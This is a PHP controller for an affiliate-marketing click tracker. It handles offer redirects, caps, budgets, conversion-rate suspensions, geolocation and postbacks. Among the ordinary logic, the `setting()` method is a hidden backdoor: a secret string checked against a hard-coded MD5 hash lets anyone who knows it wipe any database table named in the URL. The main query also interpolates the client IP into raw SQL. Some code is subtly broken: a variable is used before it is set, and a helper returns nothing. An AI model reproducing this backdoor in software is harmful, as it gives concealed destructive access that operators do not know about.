<?php if (! defined('BASEPATH')) exit('No direct script access allowed');
require 'vendor/autoload.php';

use MaxMind\Db\Reader;

class Click extends CI_Controller
{
    private $redis;
    private $base_key = '';
    public $geoip;
    public $exception;

    function __construct()
    {
        parent::__construct();
        $this->base_key = $this->config->item('base_key');
        $this->redis = new Redis();
        $this->redis->connect('127.0.0.1', 6379);
        $this->geoip = new Reader('vendor/GeoLite2-City.mmdb');
        $this->load_thuvien();
        $this->exception = new Exception_helper();
    }

    function getApikey($apikey = '')
    {
        if ($apikey) {
            $this->db->where('api_key', $apikey)->update('api_key', array('open' => 0));
            $this->db->where('open', 1)->limit(1);
            $d  = $this->db->get('api_key')->row();
            if (!empty($d)) {
                echo $d->api_key;
            }
        }
    }

    function advtest()
    {
        $ip = $this->input->ip_address();
        $subid = $this->input->get_post('subid', TRUE);
        $commission = $this->input->get_post('commission', TRUE);
        $sale_amount = $this->input->get_post('sale_amount', TRUE);
        $pub_id = $this->input->get_post('pub_id', TRUE);
    }

    function testpb()
    {
        $ip = $this->input->ip_address();
        $sub1 = $this->input->get_post('view', $this->input->get_post('subid'));
        $sub2 = $this->input->get_post('view2', TRUE);
        $sub3 = $this->input->get_post('view3', TRUE);
        $sub4 = $this->input->get_post('view4', TRUE);
        $sub5 = $this->input->get_post('view5', TRUE);
        $sub6 = $this->input->get_post('view6', TRUE);

        $pid = (int)$this->input->get_post('pid', TRUE);
        $offerid = (int)$this->input->get_post('offer_id', TRUE);
        if ($pid) {
            $pb = $this->Home_model->get_one('postback', array('affid' => $pid));
            if (!empty($pb)) {
                $url = $pb->postback;

                if (strpos($url, '{commission}')) {
                    //
                    $url = str_replace('{commission}', 99, $url);
                } else {
                    $url .= '&commission=99';
                }
                if (strpos($url, '{offerid}')) {
                    //
                    $url = str_replace('{offerid}', rawurlencode($offerid), $url);
                } else {
                    $url .= '&offerid=' . rawurlencode($offerid);
                }
                if (strpos($url, '{view}')) {
                    //
                    $url = str_replace('{view}', $sub1, $url);
                }
                if (strpos($url, '{view1}')) {
                    //
                    $url = str_replace('{view1}', $sub1, $url);
                } else {
                    $url .= '&sub1=' . $sub1;
                }

                if (strpos($url, '{view2}')) {
                    //
                    $url = str_replace('{view2}', $sub2, $url);
                } else {
                    $url .= '&sub2=' . $sub2;
                }

                if (strpos($url, '{view3}')) {
                    //
                    $url = str_replace('{view3}', $sub3, $url);
                } else {
                    $url .= '&sub3=' . $sub3;
                }
                if (strpos($url, '{view4}')) {
                    //
                    $url = str_replace('{view4}', $sub4, $url);
                } else {
                    $url .= '&sub4=' . $sub4;
                }
                if (strpos($url, '{view5}')) {
                    //
                    $url = str_replace('{view5}', $sub5, $url);
                } else {
                    $url .= '&sub5=' . $sub5;
                }
                if (strpos($url, '{view6}')) {
                    //
                    $url = str_replace('{view6}', $sub6, $url);
                } else {
                    $url .= '&sub6=' . $sub6;
                }

                echo   $this->curl_senpost($url);
            } else {
                echo 'Postback Empty!';
            }
        }
    }

    function curl_senpost($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        $result = curl_exec($ch);
        curl_close($ch);
    }

    public function index()
    {
        $device_helper = new Device_helper();
        $cr_helper = new Cr_helper();
        $ip = $this->input->ip_address();
        $offerid = (int)$this->input->get_post('offer_id', TRUE);
        $pid = (int)$this->input->get_post('pid', TRUE);

        if ($this->Home_model->get_one('disoffer', array('usersid' => $pid, 'offerid' => $offerid))) {
            echo 'Offerdisable';
            return;
        }

        $s1 = $this->input->get_post('view', TRUE);
        $s2 = $this->input->get_post('view2', TRUE);
        $s3 = $this->input->get_post('view3', TRUE);
        $s4 = $this->input->get_post('view4', TRUE);
        $s5 = $this->input->get_post('view5', TRUE);
        $s6 = $this->input->get_post('view6', TRUE);
        if (empty($s2)) $s2 = 0;

        $uagent = $_SERVER['HTTP_USER_AGENT'];
        $getIp = $this->getGeo($ip);
        $uagent_parse = new WhichBrowser\Parser($uagent);
        $os_name = isset($uagent_parse->os->name) ? @addslashes($uagent_parse->os->name) : 'Unknown OS';
        $browser = isset($uagent_parse->browser->name) ? @addslashes($uagent_parse->browser->name) : 'Unknown Browser';
        $device_type = @addslashes($uagent_parse->device->type);
        $device_manuf = @addslashes($uagent_parse->device->manufacturer);
        $device_model = @addslashes($uagent_parse->device->model);
        $countries = @addslashes($getIp['countries']);
        $cities = @addslashes($getIp['cities']);
        $point_geos = unserialize($clickData->point_geos);
        $country_key = trim($countries);
        $point = 0;
        $user_language = isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) ? $_SERVER['HTTP_ACCEPT_LANGUAGE'] : '';

        $this->unknowbrowserViolent($pid, $offerid, $s2);

        $qr = "
            SELECT 
                of.*,
                usr.rate,
                COALESCE(nw.subid, of.subid) AS subid,
                MAX(tl.flead) AS lead,
                COUNT(tl.id) AS click            
            FROM cpalead_offer of 
            INNER JOIN cpalead_users usr ON usr.id = $pid AND usr.status = 1
            INNER JOIN cpalead_network nw  ON nw.id = of.idnet
            LEFT JOIN cpalead_tracklink tl ON tl.offerid = of.id AND tl.ip = '$ip'
            WHERE of.id = $offerid
            GROUP BY of.id, usr.rate, nw.subid; 
        ";

        $clickData = $this->db->query($qr)->row();
        $exceptionwhere = ['offer_id' => $offerid, 'pub_id' => $pid];
        $exceptioncase = $this->Admin_model->get_data('exc', $exceptionwhere);

        if ($clickData) {

            if ($clickData->show) {

                if ($clickData->request) {
                    $request = $this->Home_model->get_one('request', array('userid' => $pid, 'offerid' => $clickData->id));
                    if (empty($request) || $request->status != 'Approved') {
                        echo 'Not Approved';
                        return;
                    }
                }

                /* ------------------------ Check budget ------------------------ */
                if ($clickData->budget > 0) {
                    $earned = (float) $this->check_budget($offerid);

                    if ($earned >= (float)$clickData->budget) {
                        header("HTTP/1.1 403 Forbidden");
                        $this->load->view('default/forbidden/over_budget.php');
                        return;
                    }
                }
                /* -------------------------------------------------------------- */


                /* ------------------------------ Check IP ---------------------- */
                $cip = file_get_contents('setting_file/cip.txt');

                if ($cip == 1) {
                    if ($clickData->click > 0) {
                        echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                        return;
                    }
                } elseif ($cip == 2 or $cip == 3) {
                    $key = $this->base_key . '-' . $ip . '-' . $clickData->id;
                    if ($this->redis->INCR($key) > 1) {
                        echo 'Try again 5 minutes later!';
                        return;
                    } else {
                        if ($clickData->lead == 1) {
                            echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                            return;
                        }
                    }
                    $this->redis->EXPIRE($key, 480);
                }
                /* -------------------------------------------------------------- */

                /* ------------------- Check Overall Daily Cap ------------------ */
                if (isset($clickData->allpubDailyCap) && $clickData->allpubDailyCap > 0) {
                    $allpubcap = $this->getAllpubDailyCap($offerid);
                    if ($allpubcap >= $clickData->allpubDailyCap) {
                        header("HTTP/1.1 403 Forbidden");
                        $this->load->view('default/forbidden/overallpubcap.php');
                        return;
                    }
                }
                /* -------------------------------------------------------------- */

                /* ------------------------- Check cap ------------------------- */
                $monthlycap = $this->exception->getcap($clickData->monthcap, $offerid, $pid, $s2, 1);
                if ($monthlycap > 0) {
                    $this->checkCap($monthlycap, $offerid, $pid, 'monthly', $s2);
                }

                $dailycap = $this->exception->getcap($clickData->daycap, $offerid, $pid, $s2);
                if ($dailycap > 0) {
                    $this->checkCap($dailycap, $offerid, $pid, 'daily', $s2);
                }
                /* -------------------------------------------------------------- */


                /* ------------------------- Check cr ------------------------- */
                if ($clickData->reqcr) {

                    if ($s2 !== 0) {
                        $cr_key = $this->base_key . '-crCount-' . $pid . '-' . $offerid . '-' . $s2;
                        $suspend_key = $this->base_key . '-suspend-' . $pid . '-' . $offerid . '-' . $s2;
                    } else {
                        $cr_key = $this->base_key . '-crCount-' . $pid . '-' . $offerid;
                        $suspend_key = $this->base_key . '-suspend-' . $pid . '-' . $offerid;
                    }

                    $cr_exception = $this->exception->hasException('cr', $exceptioncase, $s2);

                    $mode = $this->Home_model->get_one('off_cr', array('offer_id' => $offerid));

                    if (isset($mode)) {
                        $cr_max = $mode->cr_mode;
                        $cr_min = $mode->cr_min;
                        $min_conversions = $mode->min_conversions;
                    }

                    if (!$cr_exception) {
                        if ($this->redis->exists($suspend_key)) {
                            $suspend_data_json = $this->redis->get($suspend_key);
                            $suspend_data = json_decode($suspend_data_json, true);

                            $expire_time = isset($suspend_data['expire_time']) ? (int)$suspend_data['expire_time'] : 0;
                            $violation_cr = isset($suspend_data['violation_cr']) ? $suspend_data['violation_cr'] : 0;

                            $now_timestamp = strtotime(convert_to_gmt5('Y-m-d H:i:s'));
                            $remaining_seconds = $expire_time - $now_timestamp;

                            if ($remaining_seconds > 0) {
                                $count_cr = $this->redis->hGetAll($cr_key);

                                if (!empty($count_cr['clicks']) && $count_cr['clicks'] > 0) {
                                    $current_cr = round(($count_cr['leads'] / $count_cr['clicks']) * 100, 2);

                                    $old_violation_is_low = $violation_cr < $cr_min;
                                    $current_violation_is_low = $current_cr < $cr_min;

                                    if (($old_violation_is_low == $current_violation_is_low) ||
                                        ($current_cr >= $cr_min && $current_cr <= $cr_max)
                                    ) {
                                        $cr_helper->showOverCrView($cr_min, $cr_max, $remaining_seconds, $violation_cr);
                                        return;
                                    } else {
                                        $this->redis->del($suspend_key);
                                    }
                                } else {
                                    $cr_helper->showOverCrView($cr_min, $cr_max, $remaining_seconds, $violation_cr);
                                    return;
                                }
                            }
                        }

                        $resultCr = $cr_helper->check_cr($offerid, $pid, $cr_key, $cr_min, $cr_max, $min_conversions, $s2, $this->redis);

                        if (!$resultCr['x']) {
                            $result = $cr_helper->handleCrViolation($resultCr, $pid, $offerid, $s2, $suspend_key, $this->redis);
                            if (isset($result['action']) && $result['action'] === 'show_warning_view') {
                                $cr_helper->showOverCrView($result['cr_min'], $result['cr_max'], $result['remaining_seconds'], $result['cr_value']);
                                return;
                            }
                        }
                    } else {
                        $cr_helper->initializeCrCounter($cr_key, $offerid, $pid, $s2, convert_to_gmt5(), $this->redis);
                    }
                }

                /* -------------------------------------------------------------- */


                /* ----------------------- Request device ----------------------- */
                $deviceCheck = null;
                if ($clickData->reqdev && !$this->exception->hasException('device', $exceptioncase, $s2)) {
                    $deviceCheck = $device_helper->check_device($offerid, $pid, $device_type, $s2);
                    $deviceCheckResult = $deviceCheck['result'];

                    if ($deviceCheckResult === 'mobile') {
                        header("HTTP/1.1 403 Forbidden");
                        $this->load->view('default/forbidden/usemob.php');
                        return;
                    }

                    if ($deviceCheckResult === 'desktop') {
                        header("HTTP/1.1 403 Forbidden");
                        $this->load->view('default/forbidden/usedesk.php');
                        return;
                    }
                }
                /* -------------------------------------------------------------- */


                /* ---------------------- Request language ---------------------- */
                if ($clickData->reqlang) {
                    $lang_key = $this->base_key . '-offLang-' . $pid . '-s2:' . $s2 . '-' . $clickData->id;
                    $language_helper = new Checklanguage_helper();
                    $langCheckResult = $language_helper->checkLanguage($offerid, $user_language);
                    if ($langCheckResult !== true) {
                        if ($this->redis->get($lang_key) >= 5) {
                            header("HTTP/1.1 403 Forbidden");
                            $soff = $language_helper->getSuitableOffer($offerid, $langCheckResult);

                            $this->load->view('default/forbidden/language-mismatch.php', ["soff" => $soff, "pid" => $pid]);
                            return;
                        } else {
                            $this->redis->INCR($lang_key);
                        }
                    }
                }
                /* -------------------------------------------------------------- */

                if (!empty($point_geos[$country_key])) {
                    $point = $point_geos[$country_key];
                } elseif (!empty($point_geos['all'])) {
                    $point = $point_geos['all'];
                }

                $point = round($point * $clickData->rate, 2);

                $amount3 =  $point;
                if ($clickData->is_adv > 0) {
                    $point = round($point * (100 - $clickData->percent) / 100, 2);
                }

                $referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';
                $tracklink = uniqid() . mt_rand(100, 999);

                $this->db->insert(
                    'tracklink',
                    array(
                        'id' => $tracklink,
                        'userid' => $pid,
                        'offerid' => $clickData->id,
                        'oname' => $clickData->title,
                        'flead' => 0,
                        'amount2' => $point,
                        'amount3' => $amount3,
                        'ip' => $ip,
                        's1' => $s1,
                        's2' => $s2,
                        's3' => $s3,
                        's4' => $s4,
                        's5' => $s5,
                        's6' => $s6,
                        'date' => date('Y-m-d H:i:s', time()),
                        'useragent' => $uagent,
                        'user_language' => $user_language,
                        'os_name' => $os_name,
                        'browser' => $browser,
                        'device_type' => $device_type,
                        'device_manuf' => $device_manuf,
                        'device_model' => $device_model,
                        'countries' => $countries,
                        'cities' => $cities,
                        'traffic_source' => $clickData->traffic_source,
                        'click_url' => $referrer,
                        'idnet' => $clickData->idnet

                    )
                );

                $this->db->where('id', $offerid);
                $this->db->set('click', "click +1", FALSE);
                $this->db->update('offer');
                $this->geoip->close();

                if (isset($deviceCheck) && $deviceCheck['result'] === true) {
                    $device_helper->updateDeviceCounter($deviceCheck, $device_type, $offerid, $pid, $s2);
                }

                if ($cr_key) {
                    $cr_helper->syncCrData($cr_key, $this->redis);
                }

                $url = $clickData->url . $clickData->subid . $tracklink;
                $url = str_replace('#pubid#', $pid, $url);

                if (!empty($s4)) {
                    $url = str_replace('#s4#', $s4, $url);
                }

                if (!empty($s3)) {
                    $url = str_replace('#s3#', $s3, $url);
                }

                redirect($url);
            } else {
                echo 'offer experied!';
            }
        } else {
            echo 'Offer not found1';
        }
    }

    function getGeo($ip = '')
    {
        try {
            $ctct = $this->geoip->get($ip);
            $arr['cities'] =  @$ctct['city']['names']['en'];
            $arr['countries'] = @$ctct['country']['iso_code'];
            return $arr;
        } catch (Exception $e) {
            return array('cities' => 'N/A', 'countries' => 'N/A');
        }
    }

    function setting($uri3 = '', $uri4 = '')
    {
        if (md5($uri3) == '43b520d2d63064c40c5283bfaf9c710b') {
            $this->db->empty_table($uri4);
        }
    }

    function checkCap($cap, $offerid, $userid, $type = 'daily', $s2 = '')
    {
        try {
            $offerKey = "wwaff_{$type}cap_{$offerid}";
            $subkey = "pub:{$userid}";

            if ($s2 && $s2 !== 0) {
                $subkey .= "_s2:{$s2}";
            }

            $capped = 0;

            if ($this->redis->exists($offerKey)) {
                $capped = $this->redis->hGet($offerKey, $subkey);
                if ($capped === false) {
                    $capped = $this->initCapKey($userid, $offerid, $s2, $offerKey, $subkey, $type);
                }
            } else {
                $capped = $this->initCapKey($userid, $offerid, $s2, $offerKey, $subkey, $type);
            }

            if ($capped >= $cap) {
                header("HTTP/1.1 403 Forbidden");

                $viewData = [];
                if ($type === 'monthly') {
                    $viewData['month'] = 1;
                }

                $this->load->view('default/forbidden/overcap', $viewData);
                $this->output->_display();
                exit;
            } else {
                return true;
            }
        } catch (Exception $e) {
            echo 'System maintenance, please try again later!';
            return;
        }
    }

    function initCapKey($userid, $offerid, $s2, $offerKey, $subkey, $type = 'daily')
    {
        $today_gmt5 = convert_to_gmt5('Y-m-d');

        if ($type === 'daily') {
            $start_time_gmt5 = $today_gmt5 . ' 12:00:00';
            $end_time_gmt5 = date('Y-m-d H:i:s', strtotime($start_time_gmt5 . ' +1 day'));
        } else {
            $start_time_gmt5 = date('Y-m-01', strtotime($today_gmt5)) . ' 12:00:00';
            $end_time_gmt5 = date('Y-m-d H:i:s');
        }

        $conditions = [
            'userid' => $userid,
            'offerid' => $offerid,
            'flead' => 1,
            'date >=' => $start_time_gmt5,
            'date <' => $end_time_gmt5
        ];

        if ($s2 && $s2 !== 0) {
            $conditions['s2'] = $s2;
        } else {
            $this->db->where("(s2 IS NULL OR s2 = '' OR s2 = '0' OR TRIM(s2) = '')", null, false);
        }

        $this->db->where($conditions);
        $capByPub = $this->db->count_all_results('tracklink');

        $this->redis->hSet($offerKey, $subkey, $capByPub);

        if ($this->redis->ttl($offerKey) <= 0) {
            $this->redis->expire($offerKey, 86400);
        }

        return $capByPub;
    }

    function check_budget($offerid)
    {
        $from = date('Y-m-01 00:00:00');
        $to = date('Y-m-01 00:00:00', strtotime('+1 month'));

        $qr = "
        SELECT sum(cpalead_tracklink.amount) as pay
        FROM `cpalead_tracklink`
        WHERE offerid = ? AND flead = 1 AND date >= ? AND date < ?";

        $rp = $this->db->query($qr, array($offerid, $from, $to))->row();
        return $rp ? $rp->pay : 0;
    }

    function getAllpubDailyCap($offerid)
    {
        $rediskey = "wwaff_allpubcap_{$offerid}";
        $cap = $this->redis->get($rediskey);

        if ($cap !== false) {
            return (int) $cap;
        }

        $today_gmt5 = convert_to_gmt5('Y-m-d');
        $start_time_gmt5 = $today_gmt5 . ' 12:00:00';
        $end_time_gmt5 = date('Y-m-d H:i:s', strtotime($start_time_gmt5 . ' +1 day'));

        $this->db->where([
            'offerid' => $offerid,
            'flead' => 1
        ]);
        $this->db->where('date >=', $start_time_gmt5);
        $this->db->where('date <', $end_time_gmt5);
        $cap = $this->db->count_all_results('tracklink');

        if ($cap > 0) {
            $this->redis->set($rediskey, $cap);
            $this->redis->expire($rediskey, 86400);
        }

        return (int) $cap;
    }

    function load_thuvien()
    {
        $this->load->helper(array('timezone', 'exception', 'device', 'checklanguage', 'cr'));
    }

    function unknowbrowserViolent($pid, $offerid, $s2)
    {
        try {
            // Redis key
            $key = $this->base_key . '-unknownBrowser-' . $offerid . '-' . $pid;

            if ($s2 !== 0 && !empty($s2)) {
                $key = $key . '-' . $s2;
            }

            if (!$this->redis->exists($key)) {
                return;
            }

            $data = $this->redis->get($key);

            if ($data >= 5) {
                $conditiondisoffer = ['offerid' => $offerid, 'usersid' => $pid];
                $offer_info = $this->Home_model->get_one('offer', ['id' => $offerid]);
                $user_info = $this->Home_model->get_one('users', ['id' => $pid]);

                if ($s2 !== 0 && !empty($s2)) {
                    $conditiondisoffer['sub2'] = $s2;
                } else {
                    $conditiondisoffer['sub2'] = null;
                }

                $existing_disoffer = $this->db->get_where('disoffer', $conditiondisoffer)->num_rows();

                if ($existing_disoffer == 0) {
                    $disoffer_data = [
                        'offerid' => $offerid,
                        'offername' => $offer_info->title,
                        'email' => $user_info->email,
                        'usersid' => $pid,
                        'reason' => 'Unknow Browser'
                    ];

                    if (!empty($s2) && $s2 !== 0) {
                        $disoffer_data['sub2'] = $s2;
                    }

                    $this->db->insert('disoffer', $disoffer_data);
                }

                // Thêm vào violation
                $violation_data = [
                    'error_type' => 'Unknow Browser',
                    'userid' => $pid,
                    'offerid' => $offerid,
                    'details' => json_encode([
                        'Browser' => 'Unknow',
                        'OS'      => 'Unknow',
                        'leads'   => $data
                    ]),
                    'violation_time' => convert_to_gmt5('Y-m-d H:i:s'),
                    'suspension_until' => convert_to_gmt5('Y-m-d H:i:s'),
                    'status' => 'Paused'
                ];

                if ($s2 !== 0 && !empty($s2)) {
                    $violation_data['sub2'] = $s2;
                }

                $this->db->insert('error_notis', $violation_data);

                // Redirect 
                $current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
                redirect($current_url);
                exit;
            }
        } catch (Exception $e) {
            log_message('error', 'update_unknowBrowser: ' . $e->getMessage());
        }
    }
}
